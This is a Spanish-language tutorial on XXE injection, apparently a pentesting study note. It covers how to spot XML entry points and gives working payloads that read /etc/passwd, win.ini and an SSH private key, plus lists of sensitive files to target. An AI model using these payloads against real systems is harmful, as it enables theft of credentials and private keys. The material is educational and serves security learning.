# Tema: XXE - Exfiltración de archivos locales

## 1. ¿Qué es XXE y cómo funciona?

La **Inyección de Entidades Externas XML (XXE)**, del inglés *XML External Entity Injection*, es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación.

El ataque ocurre cuando una entrada XML que contiene una referencia a una entidad externa es procesada por un parser XML débilmente configurado. Esta entidad externa puede ser una URI que el parser intentará resolver, permitiendo al atacante acceder a recursos locales o remotos que no debería.

**Funcionamiento Básico:**

1.  La aplicación acepta datos en formato XML.
2.  El atacante modifica los datos XML para definir una entidad externa (por ejemplo, un archivo local del servidor) usando la sintaxis `<!ENTITY ...>`.
3.  El atacante utiliza la entidad definida dentro de un campo de datos XML (ej: `&nombre_entidad;`).
4.  El parser XML del servidor procesa el documento, sustituye la entidad por su contenido (el contenido del archivo local) y lo devuelve en la respuesta HTTP, revelando así la información.

## 2. Cómo identificar puntos de inyección/vulnerabilidad

Para encontrar vulnerabilidades XXE, debes buscar cualquier punto en la aplicación donde se envíen y procesen datos en formato XML.

**Puntos comunes de inyección:**

* **Subida de archivos:** Funcionalidades que permiten subir archivos con formatos basados en XML como `.docx`, `.xlsx`, `.svg`, o `.xml` directamente.
* **Peticiones `POST` con `Content-Type: application/xml`:** Muchas APIs y servicios web (SOAP, REST) utilizan XML para la comunicación. Intercepta estas peticiones con un proxy (como Burp Suite) y modifica el cuerpo para incluir un payload de prueba.
* **Parámetros en la URL:** Aunque menos común, algunas aplicaciones pueden recibir datos XML a través de parámetros GET.

**Proceso de identificación:**

1.  **Interceptar el tráfico:** Usa un proxy para capturar todas las peticiones que la aplicación envía al servidor.
2.  **Buscar XML:** Filtra las peticiones que contengan datos XML en el cuerpo o en parámetros.
3.  **Inyectar un payload de prueba:** Modifica la petición para incluir una entidad XML simple y comprueba si se procesa. Si la aplicación devuelve un error de parseo o un comportamiento inesperado, es un buen indicio.

## 3. Uso básico para exfiltrar archivos

Una vez identificado un punto de inyección, puedes construir un payload para leer archivos del sistema de ficheros del servidor. La clave es usar el protocolo `file:///`.

### Ejemplos para Linux

En sistemas Linux, los archivos de interés suelen estar en el directorio `/etc/`.

**Payload para leer `/etc/passwd`:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
   <firstName>John</firstName>
   <lastName>&xxe;</lastName>
</userInfo>
```

**Respuesta esperada (dentro del XML):**

```xml
...
<lastName>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
</lastName>
...
```

**Otros archivos de interés en Linux:**

* `/etc/shadow` (requiere privilegios de root para ser leído por el proceso de la aplicación)
* `/etc/hosts`
* `/etc/issue`
* `/proc/version`
* `/proc/self/environ`
* `/var/log/apache2/access.log`

### Ejemplos para Windows

En sistemas Windows, los archivos de configuración y sistema se encuentran principalmente en `C:\Windows\` o en directorios de usuario.

**Payload para leer `C:\Windows\win.ini`:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
   <!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini">
]>
<product>
   <productId>123</productId>
   <description>&xxe;</description>
</product>
```

**Respuesta esperada (dentro del XML):**

```xml
...
<description>; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
</description>
...
```

**Otros archivos de interés en Windows:**

* `c:\Windows\System32\drivers\etc\hosts`
* `c:\boot.ini`
* `c:\Users\Administrator\NTUSER.DAT`
* `c:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log`

## 4. Caso de uso: Exfiltración de un `id_rsa`

Las claves SSH son un objetivo de alto valor, ya que pueden permitir el acceso a otros sistemas. La clave privada `id_rsa` suele encontrarse en el directorio `.ssh` del home del usuario que ejecuta la aplicación web.

**Payload de ejemplo para exfiltrar `id_rsa`:**

Este payload asume que la aplicación se ejecuta con el usuario `daniel` en un sistema tipo Linux/macOS o que la ruta es válida en Windows.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
   <!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
]>
<order>
    <quantity>2</quantity>
    <item>&xxe;</item>
    <address>test</address>
</order>
```

**Resultado en la respuesta de la aplicación:**

Si la vulnerabilidad es explotable, la aplicación devolverá el contenido de la clave privada `id_rsa` dentro de la estructura XML, como se muestra en el ejemplo que proporcionaste:

```xml
<order>
    <quantity>2</quantity>
    <item>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----</item>
    <address>test</address>
</order>
```

## 5. Entendiendo el Payload: DOCTYPE y ENTITY

Para que el ataque XXE funcione, el payload XML debe contener una estructura específica. Analicemos las partes clave:

`<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

* **`<!DOCTYPE root [...]>`**: Esta es la declaración de **Definición de Tipo de Documento** (DTD). Le indica al parser XML la estructura que debe seguir el documento. En un ataque XXE, el atacante define su propia DTD "en línea" (dentro de los corchetes `[]`) para declarar una entidad maliciosa. El `root` debe coincidir con el elemento raíz del documento XML (por ejemplo, `<order>`, `<userInfo>`, etc.).

* **`<!ENTITY xxe ... >`**: Esto declara una **entidad**. Una entidad en XML es similar a una variable en un lenguaje de programación; se le asigna un nombre y un valor.

    * **`xxe`**: Es el nombre que le damos a nuestra entidad. Podríamos llamarla como quisiéramos (ej: `fichero`, `data`, etc.).
    * **`SYSTEM`**: Esta palabra clave es crucial. Indica que el valor de la entidad no está en el propio documento, sino que debe cargarse desde un **recurso externo**.
    * **`"file:///etc/passwd"`**: Es la URI del recurso externo. El parser intentará resolver esta URI. Al usar el protocolo `file://`, le ordenamos que lea un archivo del sistema de ficheros local del servidor.

* **`&xxe;`**: Esta es la **referencia a la entidad**. Cuando el parser XML encuentra esta sintaxis (un ampersand `&` seguido del nombre de la entidad y un punto y coma `;`), la reemplaza por el valor que se le asignó. En nuestro caso, la reemplaza por el contenido del archivo `/etc/passwd`.

En resumen, el atacante utiliza la DTD para crear una "variable" (`ENTITY`) que apunta a un archivo local (`SYSTEM "file://..."`) y luego "imprime" el contenido de esa variable en la respuesta XML usando una referencia (`&xxe;`).
